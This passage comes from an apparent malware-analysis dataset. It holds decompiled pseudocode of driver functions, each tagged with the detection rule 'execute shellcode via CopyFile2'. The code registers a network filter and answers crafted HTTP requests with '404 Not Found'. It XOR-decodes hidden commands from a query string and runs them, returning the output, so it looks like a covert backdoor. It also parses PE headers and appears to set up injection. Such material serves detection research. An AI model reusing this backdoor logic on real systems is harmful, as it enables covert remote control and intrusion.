fcn.000619e4(iStackX32, auStack760, 0, 4, auStackX24, CONCAT44(uVar8, 4));\n                    uVar3 = uVar2;\n                    if (uVar2 == 0) goto code_r0x00039f46;\n                }\n            }\n        }\n    }\n    fcn.00061a14(uStack744);\ncode_r0x00039f46:\n    fcn.000619de(uStack744);\n    if (iStackX32 != 0) {\n        fcn.000619de();\n    }\n    return uVar3;\n}\n",
        "token_count": 1708
    },
    "00039f70": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.00039f70(void)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    uint auStackX8 [2];\n    uint auStackX16 [2];\n    int64_t iStackX24;\n    ulong uStackX32;\n    ulong in_stack_fffffffffffffd80;\n    uint uVar3;\n    uint auStack616 [2];\n    ulong uStack608;\n    uchar *puStack600;\n    uint uStack592;\n    ulong uStack584;\n    ulong uStack576;\n    uchar auStack568 [16];\n    uchar auStack552 [16];\n    uchar auStack536 [520];\n    \n    uVar1 = in_stack_fffffffffffffd80 >> 0x20;\n    iStackX24 = 0;\n    auStackX16[0] = 1;\n    auStackX8[0] = 2;\n    fcn.00061a0e(auStack536, 0x100, 0x11ac0, L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\", \n                 L\"filter_c06b1a3b\");\n    fcn.000619f0(auStack568, auStack536);\n    puStack600 = auStack568;\n    auStack616[0] = 0x30;\n    uStack608 = 0;\n    uStack592 = 0x40;\n    uStack584 = 0;\n    uStack576 = 0;\n    uVar2 = fcn.00061ada(&uStackX32, 0xf003f, auStack616, 0, 0, uVar1 << 0x20, auStackX8);\n    if (uVar2 != 0) {\n        return uVar2;\n    }\n    uVar2 = 0;\n    fcn.00061a0e(auStack536, 0x100, 0x14970, L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\", \n                 L\"filter_c06b1a3b\", 0x14ad8);\n    fcn.000619f0(auStack568, auStack536);\n    puStack600 = auStack568;\n    uVar2 = uVar2 & 0xffffffff00000000;\n    auStack616[0] = 0x30;\n    uStack608 = 0;\n    uStack592 = 0x40;\n    uStack584 = 0;\n    uStack576 = 0;\n    uVar1 = fcn.00061ada(&iStackX24, 0xf003f, auStack616, 0, 0, uVar2, auStackX8);\n    uVar3 = uVar2 >> 0x20;\n    uVar2 = uVar1;\n    if (uVar1 == 0) {\n        fcn.000619f0(auStack552, 0x14aa8);\n        uVar1 = fcn.000619e4(iStackX24, auStack552, 0, 4, auStackX16, CONCAT44(uVar3, 4));\n        uVar2 = uVar1;\n        if (uVar1 == 0) goto code_r0x0003a152;\n    }\n    fcn.00061a14(uStackX32);\ncode_r0x0003a152:\n    fcn.000619de(uStackX32);\n    if (iStackX24 != 0) {\n        fcn.000619de();\n    }\n    return uVar2;\n}\n",
        "token_count": 776
    },
    "0003a32c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0003a32c(ulong arg1, ulong noname_1, uchar *arg3, ulong arg4)\n\n{\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    fcn.00061b2e(arg3, 200);\n    *arg3 = 0x8b;\n    *(arg3 + 2) = 200;\n    arg3[1] = 1;\n    arg3[4] = 6;\n    arg3[5] = 0;\n    arg3[6] = 1;\n    arg3[7] = 0;\n    *(arg3 + 8) = 0;\n    fcn.000619f0(&uStack72, L\"{c06b1a3b-3d16-4181-8c8d-7015bfc5b972}\");\n    *(arg3 + 0x10) = uStack72;\n    *(arg3 + 0x14) = uStack68;\n    *(arg3 + 0x18) = uStack64;\n    *(arg3 + 0x1c) = uStack60;\n    fcn.000619f0(&uStack56, L\"{c06b1a3b-3d16-4181-8c8d-7015bfc5b972}\");\n    *(arg3 + 0x20) = uStack56;\n    *(arg3 + 0x24) = uStack52;\n    *(arg3 + 0x28) = uStack48;\n    *(arg3 + 0x2c) = uStack44;\n    fcn.000619f0(&uStack40, L\"filter_c06b1a3b\");\n    *(arg3 + 0x40) = 0x3a180;\n    *(arg3 + 0x30) = uStack40;\n    *(arg3 + 0x34) = uStack36;\n    *(arg3 + 0x38) = uStack32;\n    *(arg3 + 0x3c) = uStack28;\n    *(arg3 + 0x50) = 0x3a198;\n    *(arg3 + 0x58) = 0x3a1e4;\n    *(arg3 + 0x60) = 0x3a1cc;\n    *(arg3 + 0x68) = 0x3a1b4;\n    *(arg3 + 0x48) = 0x3a318;\n    *(arg3 + 0x98) = 0x3a1f4;\n    *(arg3 + 0xa0) = 0x3a224;\n    *(arg3 + 0xa8) = 0x3a20c;\n    *(arg3 + 0x70) = 0x3a2a4;\n    *(arg3 + 0x90) = 0x3a2c4;\n    *(arg3 + 0x78) = 0x3a288;\n    *(arg3 + 0x88) = 0x3a2e0;\n    *(arg3 + 0xb0) = 0x3a258;\n    *(arg3 + 0xb8) = 0x3a270;\n    *(arg3 + 0xc0) = 0x3a240;\n    *(arg3 + 0x80) = 0x3a300;\n    (**0x88b08)(arg1, arg3, arg3, arg4);\n    return;\n}\n",
        "token_count": 841
    },
    "0003ef28": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.0003ef28(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    ulong *arg1_00;\n    uint32_t uVar3;\n    int64_t iVar4;\n    char *pcVar5;\n    char *pcVar6;\n    uint64_t uStackX8;\n    int64_t iStackX16;\n    uchar auStackX24 [6];\n    uint8_t uStackX30;\n    uint64_t uStackX32;\n    uint64_t in_stack_fffffffffffff948;\n    uint64_t in_stack_fffffffffffff950;\n    uint64_t in_stack_fffffffffffff958;\n    int64_t iStack1680;\n    uchar auStack1672 [128];\n    char acStack1544 [1512];\n    \n    iStackX16 = 0;\n    fcn.00061b10(auStack1672, 0x157c8, *(arg1 + 0x38), *(arg1 + 0x39), \n                 in_stack_fffffffffffff948 & 0xffffffff00000000 | *(arg1 + 0x3a), \n                 in_stack_fffffffffffff950 & 0xffffffff00000000 | *(arg1 + 0x3b), \n                 in_stack_fffffffffffff958 & 0xffffffff00000000 | *(arg1 + 0x3c));\n    arg1_00 = fcn.0002fbf0(0xbe8);\n    if (arg1_00 != NULL) {\n        fcn.00061a56(arg1_00, 0, 0xbe8);\n        *arg1_00 = *(arg1 + 0x20);\n        arg1_00[1] = *(arg1 + 0x28);\n        if (*(arg1 + 0x634) < 0xbb9) {\n            arg1_00[3] = 0;\n            arg1_00[2] = *(arg1 + 0x634) % 3000;\n            arg1_00[4] = *(arg1 + 0x634);\n            fcn.000619f6(arg1_00 + 5, arg1 + 0x58, *(arg1 + 0x634));\ncode_r0x0003f00c:\n            uStackX8 = 0;\n            do {\n                iVar2 = fcn.0003eab8(arg1_00, acStack1544, 0x5dc, &uStackX8);\n                if ((iVar2 == 0) || (uStackX8 < 5)) break;\n                uVar3 = 0;\n                iVar4 = 0;\n                if (uStackX8 != 0) {\n                    do {\n                        if ((acStack1544[iVar4] != '\\n') &&\n                           ((acStack1544[iVar4] != '\\r' || (acStack1544[iVar4 + 1] != '\\n')))) break;\n                        uVar3 = uVar3 + 1;\n                        iVar4 = iVar4 + 1;\n                    } while (uVar3 < uStackX8);\n                }\n                if (uVar3 < uStackX8) {\n                    pcVar5 = acStack1544 + uVar3;\n                    do {\n                        if (*pcVar5 == '\\r') {\n                            uVar3 = uVar3 + 1;\n                            pcVar5 = pcVar5 + 1;\n                            if (uStackX8 <= uVar3) goto code_r0x0003f0e8;\n                        }\n                        pcVar6 = pcVar5;\n                        if (*pcVar5 == '\\n') {\n                            pcVar6 = pcVar5 + 1;\n                            if (uStackX8 <= uVar3 + 1) goto code_r0x0003f0e8;\n                            uVar1 = uVar3 + 1;\n                            if (*pcVar6 == '\\r') {\n                                pcVar6 = pcVar5 + 2;\n                                uVar1 = uVar3 + 2;\n                                if (uStackX8 <= uVar3 + 2) goto code_r0x0003f0e8;\n                            }\n                            uVar3 = uVar1;\n                            if (*pcVar6 == '\\n') {\n                                uStackX8 = uVar3 + 1;\n                                iVar2 = fcn.0003eab8(arg1_00, acStack1544, uStackX8, &uStackX32);\n                                if ((iVar2 == 0) || (uStackX32 != uStackX8)) goto code_r0x0003f0e8;\n                                iVar2 = fcn.0003e578(acStack1544, uStackX8, &iStackX16, &iStack1680);\n                                if (iVar2 == 0) goto code_r0x0003f0e8;\n                                if ((uStackX30 & 1) != 0) {\n                                    fcn.0003ed40(acStack1544, uStackX8, auStack1672, 1);\n                                }\n                                iVar2 = fcn.00058a5c(auStackX24, iStackX16 + 8, iStack1680 + -8, auStack1672);\n                                if ((iVar2 != 0) || ((*(arg1_00 + 0x17c) & 1) != 0)) goto code_r0x0003f0e8;\n                                fcn.0002fc50(iStackX16);\n                                iStackX16 = 0;\n                                goto code_r0x0003f00c;\n                            }\n                        }\n                        uVar3 = uVar3 + 1;\n                        pcVar5 = pcVar6 + 1;\n                    } while (uVar3 < uStackX8);\n                }\n                iVar2 = fcn.0003ec74(arg1_00);\n            } while (iVar2 != 0);\n        }\n    }\ncode_r0x0003f0e8:\n    fcn.0002fc50(iStackX16);\n    fcn.0002fc50(arg1_00);\n    fcn.00045f8c(*(arg1 + 0x20), *(arg1 + 0x28));\n    fcn.00045f64(arg1);\n    return 0;\n}\n",
        "token_count": 1380
    },
    "0003f23c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.0003f23c(int64_t arg1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint32_t uVar9;\n    char *pcVar10;\n    int32_t aiStackX8 [2];\n    uint *puStackX16;\n    ulong auStackX24 [2];\n    uint64_t in_stack_fffffffffffffdb8;\n    ulong *puVar11;\n    char acStack552 [128];\n    uint8_t auStack424 [256];\n    uchar auStack168 [136];\n    \n    uVar4 = *(arg1 + 0x3c);\n    uVar9 = *(arg1 + 0x3b);\n    auStackX24[0] = 0;\n    puStackX16 = NULL;\n    fcn.00061b10(auStack168, 0x157c8, *(arg1 + 0x38), *(arg1 + 0x39), \n                 in_stack_fffffffffffffdb8 & 0xffffffff00000000 | *(arg1 + 0x3a), uVar9, uVar4);\n    uVar2 = *(arg1 + 0x634);\n    puVar11 = auStackX24;\n    fcn.0003ed40(arg1 + 0x58, uVar2, auStack168, 0);\n    if (*(arg1 + 0x30) == 6) {\n        fcn.00061b10(acStack552, 0x15850, 0xd, \"404 Not Found\", puVar11, uVar9, uVar4);\n        uVar8 = 0xffffffffffffffff;\n        pcVar10 = acStack552;\n        do {\n            if (uVar8 == 0) break;\n            uVar8 = uVar8 - 1;\n            cVar1 = *pcVar10;\n            pcVar10 = pcVar10 + 1;\n        } while (cVar1 != '\\0');\n        fcn.00045e34(*(arg1 + 0x20), *(arg1 + 0x28), acStack552, ~uVar8 - 1);\n    }\n    else {\n        iVar6 = fcn.00061bb8(arg1 + 0x5d, 0x3f, uVar2 - 5);\n        if (((iVar6 != 0) && (*(iVar6 + 0xb) == '&')) && (*(iVar6 + 0xc) == 'a')) {\n            iVar6 = iVar6 + 0xd;\n            iVar7 = fcn.00061bb8(iVar6);\n            if ((iVar7 != 0) && ((iVar7 - iVar6) + 1U < 0x101)) {\n                iVar5 = fcn.0002f058(iVar6, auStack424, iVar7 - iVar6);\n                if (iVar5 != -1) {\n                    iVar6 = 0;\n                    if (0 < iVar5) {\n                        do {\n                            iVar7 = iVar6 + 1;\n                            auStack424[iVar6] = auStack424[iVar6] ^ *(iVar6 + 0x65d70);\n                            iVar6 = iVar7;\n                        } while (iVar7 < iVar5);\n                    }\n                    auStack424[iVar5] = 0;\n                    fcn.00060208(auStackX24[0], auStack424, iVar5 + 1, 0);\n                    iVar5 = fcn.00060288(auStackX24[0], &puStackX16, aiStackX8, 20000);\n                    if (iVar5 == 0) {\n                        if (aiStackX8[0] == 4) {\n                            uVar3 = *puStackX16;\n                            fcn.0005fde8(auStackX24[0], puStackX16);\n                            fcn.00061b10(acStack552, 0x157e0, uVar3);\n                            uVar8 = 0xffffffffffffffff;\n                            pcVar10 = acStack552;\n                            do {\n                                if (uVar8 == 0) break;\n                                uVar8 = uVar8 - 1;\n                                cVar1 = *pcVar10;\n                                pcVar10 = pcVar10 + 1;\n                            } while (cVar1 != '\\0');\n                            iVar5 = fcn.00045e34(*(arg1 + 0x20), *(arg1 + 0x28), acStack552, ~uVar8 - 1);\n                            if (iVar5 == 0) {\n                                while (iVar5 = fcn.00060288(auStackX24[0], &puStackX16, aiStackX8, 20000),  iVar5 == 0)\n                                {\n                                    iVar5 = fcn.00045e34(*(arg1 + 0x20), *(arg1 + 0x28), puStackX16, aiStackX8[0]);\n                                    if (iVar5 != 0) goto code_r0x0003f4ef;\n                                    fcn.0005fde8(auStackX24[0], puStackX16);\n                                }\n                                puStackX16 = NULL;\n                            }\n                        }\n                        else {\n                            fcn.0005fde8(auStackX24[0], puStackX16);\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0003f4ef:\n    fcn.0002fc50(puStackX16);\n    fcn.0005fd0c(auStackX24, 0);\n    fcn.00045f8c(*(arg1 + 0x20), *(arg1 + 0x28));\n    fcn.00045f64(arg1);\n    return 0;\n}\n",
        "token_count": 1292
    },
    "00044bac": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00044bac(int64_t arg1, ulong *arg2, ulong arg3, ulong arg4)\n\n{\n    int16_t iVar1;\n    uint32_t in_stack_00000028;\n    ulong uStack56;\n    uint uStack48;\n    ushort uStack44;\n    \n    if ((arg3 == 0xe) && (iVar1 = fcn.0002fd20(0x7ff),  *(arg2 + 0xc) == iVar1)) {\n        uStack56 = *arg2;\n        uStack48 = *(arg2 + 1);\n        uStack44 = *(arg2 + 0xc);\n        uStack44 = fcn.0002fd20(CONCAT62(&uStack56 >> 0x10, 0x800));\n        fcn.00043244(*(arg1 + 0x10), 0, &uStack56, arg3);\n        return;\n    }\n    fcn.00049040(arg2, arg3, arg4, in_stack_00000028);\n    return;\n}\n",
        "token_count": 230
    },
    "00045300": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.00045300(int64_t arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t arg2_00;\n    uint64_t uVar2;\n    int64_t **ppiVar3;\n    uint8_t uVar4;\n    uchar auStackX32 [8];\n    uint32_t in_stack_00000028;\n    uint64_t in_stack_ffffffffffffff88;\n    uint64_t uVar5;\n    int64_t iStack104;\n    int64_t **ppiStack96;\n    int64_t aiStack88 [3];\n    \n    uVar1 = in_stack_00000028;\n    arg4 = arg4 & 0xffffffff;\n    aiStack88[0] = 0;\n    ppiStack96 = NULL;\n    iStack104 = 0;\n    uVar4 = 0;\n    arg2_00 = fcn.0002fbf0(arg4 + in_stack_00000028);\n    uVar2 = arg2_00;\n    if (arg2_00 != 0) {\n        uVar5 = in_stack_ffffffffffffff88 & 0xffffffff00000000 | arg4;\n        uVar2 = (**0x11040)(&stack0x00000028, aiStack88, *0x7b898, arg2_00, uVar5);\n        if (in_stack_00000028 == 0) {\n            fcn.000619f6(arg2_00, arg3, arg4);\n            uVar2 = (**0x11040)(&stack0x00000028, &ppiStack96, *0x7b898, arg2_00 + arg4, \n                                uVar5 & 0xffffffff00000000 | uVar1);\n            if ((in_stack_00000028 == 0) &&\n               (uVar2 = (**0x110a8)(&stack0x00000028, &iStack104),  ppiVar3 = ppiStack96,  in_stack_00000028 == 0)) {\n                for (; *ppiVar3 != NULL; ppiVar3 = *ppiVar3) {\n                }\n                if (*(iStack104 + 8) == 0) {\n                    *(iStack104 + 0x10) = ppiVar3;\n                }\n                *ppiVar3 = *(iStack104 + 8);\n                *(iStack104 + 8) = ppiStack96;\n                *(iStack104 + 0x28) = 0;\n                *(iStack104 + 0x70) = aiStack88[0];\n                uVar2 = (**(arg1 + 0x68))(*(arg1 + 8), arg2, 0, uVar1, iStack104, auStackX32);\n                in_stack_00000028 = uVar2;\n                if (in_stack_00000028 == 0) {\n                    uVar2 = fcn.00044bac(arg1, arg2_00, arg4, arg2_00 + arg4);\n                    uVar4 = 1;\n                }\n                else if (in_stack_00000028 == 0x103) {\n                    iStack104 = 0;\n                    aiStack88[0] = 0;\n                    ppiStack96 = NULL;\n                    uVar4 = 1;\n                    arg2_00 = 0;\n                }\n            }\n        }\n    }\n    if (iStack104 != 0) {\n        uVar2 = (**0x11060)();\n    }\n    if (aiStack88[0] != 0) {\n        uVar2 = (**0x11110)();\n    }\n    if (ppiStack96 != NULL) {\n        uVar2 = (**0x11110)();\n    }\n    if (arg2_00 != 0) {\n        uVar2 = fcn.0002fc50(arg2_00);\n    }\n    return uVar2 & 0xffffffffffffff00 | uVar4;\n}\n",
        "token_count": 877
    },
    "000471f0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.000471f0(ulong noname_0, ulong arg2)\n\n{\n    int64_t **ppiVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    uint8_t *arg2_00;\n    uint8_t auStackX24 [16];\n    \n    arg2_00 = auStackX24;\n    iVar3 = fcn.0004633c(arg2, arg2_00);\n    if (iVar3 != 0) {\n        ppiVar1 = iVar3 + 0x208;\n        while (*ppiVar1 != ppiVar1) {\n            piVar2 = *ppiVar1;\n            arg2_00 = NULL;\n            iVar3 = *piVar2;\n            *ppiVar1 = iVar3;\n            *(iVar3 + 8) = ppiVar1;\n            *(piVar2 + -0xf) = 0;\n            (**0x11588)(piVar2 + -0x15, 0);\n        }\n        (**0x113c0)(0x87c80, arg2_00 & 0xffffffffffffff00 | auStackX24[0]);\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "00047fe0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint fcn.00047fe0(int64_t arg1, int64_t arg2, ulong noname_2, uint64_t *arg4)\n\n{\n    int64_t iVar1;\n    bool bVar2;\n    bool bVar3;\n    int32_t iVar4;\n    int64_t aiStackX8 [4];\n    int32_t in_stack_00000028;\n    uint auStack88 [2];\n    uint32_t uStack80;\n    uchar auStack72 [40];\n    \n    bVar2 = false;\n    (*_fcn.00011600)(auStack72, 0);\n    auStack88[0] = 0xc0000001;\n    *(arg2 + 0x50) = auStack72;\n    *(arg2 + 0x48) = auStack88;\n    if (in_stack_00000028 != -1) {\n        iVar1 = *(arg2 + 0xb8);\n        *(iVar1 + -0x10) = 0x47250;\n        *(iVar1 + -0x45) = 0xe0;\n        *(iVar1 + -8) = auStack72;\n    }\n    iVar1 = *(arg2 + 0xb8);\n    *(arg2 + 0x43) = *(arg2 + 0x43) + -1;\n    *(arg2 + 0xb8) = iVar1 + -0x48;\n    *(iVar1 + -0x20) = arg1;\n    iVar4 = (**(*(arg1 + 8) + 0x70 + **(arg2 + 0xb8) * 8))();\n    bVar3 = false;\n    if (iVar4 == 0x103) {\n        if (in_stack_00000028 == -1) {\n            (*_fcn.00011628)();\n            goto code_r0x0004811b;\n        }\n        aiStackX8[0] = in_stack_00000028 * -10000;\n        iVar4 = (*_fcn.00011628)(auStack72, 0, 0, 0, aiStackX8);\n        if (iVar4 == 0x102) {\n            (**0x114c0)(arg2);\n            (*_fcn.00011628)(auStack72, 0, 0, 0, 0);\n            bVar3 = true;\n        }\n    }\n    bVar2 = bVar3;\n    if (in_stack_00000028 != -1) {\n        (**0x11588)(arg2, 0);\n    }\ncode_r0x0004811b:\n    if (bVar2) {\n        auStack88[0] = 0x102;\n    }\n    if (arg4 != NULL) {\n        *arg4 = uStack80;\n    }\n    return auStack88[0];\n}\n",
        "token_count": 617
    },
    "0004aefc": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0004aefc(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    ulong auStackX24 [2];\n    \n    iVar1 = fcn.00049f40(auStackX24, 0x400, arg1);\n    if (iVar1 == 0) {\n        fcn.00049d80(auStackX24[0], arg2);\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "0004d48c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0004d48c(ulong noname_0, int64_t arg2, ulong *arg3)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    int32_t iVar3;\n    int64_t arg1;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uStackX32;\n    ulong uStack328;\n    int64_t iStack320;\n    int64_t iStack312;\n    int64_t iStack304;\n    uint auStack296 [2];\n    ulong uStack288;\n    uchar auStack280 [16];\n    int64_t iStack264;\n    int64_t iStack248;\n    uint auStack240 [2];\n    ulong uStack232;\n    ulong uStack224;\n    uint uStack216;\n    ulong uStack208;\n    ulong uStack200;\n    ulong uStack192;\n    ulong uStack184;\n    ushort uStack168;\n    ushort uStack166;\n    uint uStack120;\n    int32_t iStack116;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    \n    arg1 = 0;\n    uStack328 = 0;\n    iStack320 = 0;\n    iVar4 = 0;\n    iStack304 = 0;\n    iStack312 = 0;\n    iStack248 = 0;\n    iVar3 = fcn.00049d80(0xffffffffffffffff, &uStackX32);\n    iVar5 = arg1;\n    if (iVar3 == 0) {\n        if ((uStackX32 != '\\0') && (0xffffffff < *(arg2 + 0x23))) {\n            return 0x21590066;\n        }\n        iVar3 = fcn.00049fa4(0xffffffffffffffff, auStack280, 0, 0);\n        if (iVar3 == 0) {\n            arg1 = fcn.0002fbc4(0x500);\n            iVar5 = iVar4;\n            if (arg1 == 0) {\n                iVar3 = 0x21590004;\n            }\n            else {\n                uVar1 = *(arg2 + 0x33);\n                uVar2 = *(arg2 + 0x23);\n                fcn.00061a56(arg1, 0, 0x2a0);\n                *(arg1 + 0x30) = 0x10000b;\n                *(arg1 + 0x80) = uVar1;\n                *(arg1 + 0xf8) = uVar2;\n                *(arg1 + 0x98) = iStack264 + -0x28;\n                *(arg1 + 0xc0) = 0xf0e0d0c0a0908070;\n                auStack240[0] = 0x30;\n                uStack232 = 0;\n                uStack216 = 0;\n                uStack224 = 0;\n                uStack208 = 0;\n                uStack200 = 0;\n                iVar3 = fcn.0001e5e8(&uStack328, 0x1f03ff, auStack240, 0xffffffffffffffff);\n                if (((iVar3 == 0) && (iVar3 = fcn.0002f51c(uStack328, &iStack320),  iVar3 == 0)) &&\n                   (iVar3 = fcn.0004cc44(&iStack304),  iVar5 = iStack304,  iVar3 == 0)) {\n                    iVar3 = fcn.0002f51c(iStack304, &iStack312);\n                    iVar4 = iStack312;\n                    if (iVar3 != 0) {\n                        iVar4 = iVar5;\n                    }\n                    iStack312 = iVar4;\n                    fcn.00061a56(&uStack168, 0, 0x58);\n                    uStack96 = uStack192;\n                    uStack88 = uStack184;\n                    uStack166 = 0x58;\n                    uStack168 = 0x30;\n                    uStack120 = 0x10001;\n                    uStack104 = uStack328;\n                    iVar3 = fcn.00061bfa(uStack192, iVar4, &uStack168, &uStack168);\n                    if ((iVar3 == 0) && (iVar3 = iStack116,  iStack116 == 0)) {\n                        auStack296[0] = 0x1f;\n                        fcn.00061bf4(iStack320, 2, auStack296);\n                        iVar3 = fcn.0001e59c(iStack320, 0);\n                    }\n                }\n            }\n        }\n    }\n    fcn.0002f57c(iVar5, iStack312);\n    fcn.0002fc50(arg1);\n    if (iVar3 == 0) {\n        if (arg3 != NULL) {\n            *arg3 = uStack328;\n        }\n    }\n    else {\n        if (iStack320 != 0) {\n            fcn.0001e868(iStack320, 0);\n            fcn.000619de(uStack328);\n            uStackX32 = 0xffffffffffb3b4c0;\n            (**0x115e0)(0, 0, &uStackX32);\n        }\n        if (iStack248 != 0) {\n            uStack288 = 0;\n            fcn.00061be2(0xffffffffffffffff, &iStack248, &uStack288, 0x8000);\n        }\n    }\n    fcn.0002f57c(uStack328, iStack320);\n    return iVar3;\n}\n",
        "token_count": 1235
    },
    "0004df8c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0004df8c(int64_t arg1)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    ulong uStackX8;\n    int64_t iStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    uint64_t uVar4;\n    int32_t aiStack72 [12];\n    \n    uVar4 = 0;\n    iStackX16 = 0;\n    uVar3 = fcn.0001a25c(*(arg1 + 0x17), *(arg1 + 0x2f), 0, 0);\n    if (uVar3 == 0) {\n        uStackX8 = 0xfffffffff70f2e80;\n        uVar3 = fcn.00061aa4(*(arg1 + 0x43), 0, &uStackX8);\n        if (uVar3 == 0x102) {\n            *(arg1 + 0x53) = 1;\n            uStackX8 = CONCAT44(uStackX8._4_4_, 100);\n            while( true ) {\n                LOCK();\n                puVar1 = arg1 + 0x5b;\n                uVar4 = *puVar1;\n                *puVar1 = *puVar1 ^ (uVar4 == 0) * *puVar1;\n                if (uVar4 == 0) break;\n                if (uStackX8 == 0) goto code_r0x0004e050;\n                uStackX24 = 0xfffffffffff0bdc0;\n                (**0x115e0)(0, 0, &uStackX24);\n                uStackX8 = uStackX8 & 0xffffffff00000000 | uStackX8 - 1;\n            }\n            if (uStackX8 == 0) {\ncode_r0x0004e050:\n                *(arg1 + 0x2b) = 0;\n            }\n        }\n        else {\n            *(arg1 + 0x2b) = 0;\n            if (uVar3 == 0) {\n                while( true ) {\n                    LOCK();\n                    puVar1 = arg1 + 0x5b;\n                    uVar2 = *puVar1;\n                    *puVar1 = *puVar1 ^ (uVar2 == 0) * *puVar1;\n                    if (uVar2 == 0) break;\n                    uStackX32 = 0xfffffffffff0bdc0;\n                    (**0x115e0)(0, 0, &uStackX32);\n                }\n                if (*(arg1 + 0x4b) == 0) {\n                    uVar3 = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00061b58(*(arg1 + 0x1b), *(arg1 + 0x4b), 0xffffffffffffffff, &iStackX16, 0x10000000, \n                                         0x200, uVar4 & 0xffffffff00000000);\n                    if ((uVar3 == 0) && (uVar3 = fcn.0001e9a8(iStackX16, 0, aiStack72, 0x30),  uVar3 == 0)) {\n                        uVar3 = -(aiStack72[0] != 1) & 0xc0000001;\n                    }\n                }\n            }\n        }\n    }\n    if (iStackX16 != 0) {\n        fcn.000619de();\n    }\n    fcn.000619de(*(arg1 + 0x43));\n    return uVar3;\n}\n",
        "token_count": 819
    },
    "0004e6ac": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.0004e6ac(ulong arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    int32_t *arg2_00;\n    int64_t aiStack664 [2];\n    int16_t aiStack648 [30];\n    int32_t iStack588;\n    int32_t aiStack584 [6];\n    int16_t iStack560;\n    int32_t aiStack328 [68];\n    \n    aiStack664[0] = 0;\n    arg2_00 = aiStack584;\n    iVar1 = fcn.00049f40(aiStack664, 0x18, arg1);\n    arg1_00 = aiStack664[0];\n    if (iVar1 == 0) {\n        if (aiStack664[0] == 0) {\n            fcn.000619f6(aiStack648, arg2, 0x40);\n        }\n        else {\n            iVar1 = fcn.0002fb84(aiStack664[0], arg2, aiStack648);\n            arg1_00 = aiStack664[0];\n            if (iVar1 != 0) goto code_r0x0004e849;\n        }\n        if (aiStack648[0] == 0x5a4d) {\n            if (arg1_00 == 0) {\n                fcn.000619f6(aiStack584, arg2 + iStack588, 0xf8);\n            }\n            else {\n                iVar1 = fcn.0002fb84(arg1_00, arg2 + iStack588, aiStack584);\n                arg1_00 = aiStack664[0];\n                if (iVar1 != 0) goto code_r0x0004e849;\n            }\n            if (aiStack584[0] == 0x4550) {\n                if (iStack560 != 0x10b) {\n                    if (arg1_00 == 0) {\n                        fcn.000619f6(aiStack328, iStack588 + arg2, 0x108);\n                    }\n                    else {\n                        iVar1 = fcn.0002fb84(arg1_00, iStack588 + arg2, aiStack328);\n                        arg1_00 = aiStack664[0];\n                        if (iVar1 != 0) goto code_r0x0004e849;\n                    }\n                    arg2_00 = aiStack328;\n                }\n                iVar1 = fcn.0004e25c(arg1_00, arg2_00, arg2, arg1);\n                arg1_00 = aiStack664[0];\n                goto code_r0x0004e849;\n            }\n        }\n        iVar1 = -1;\n    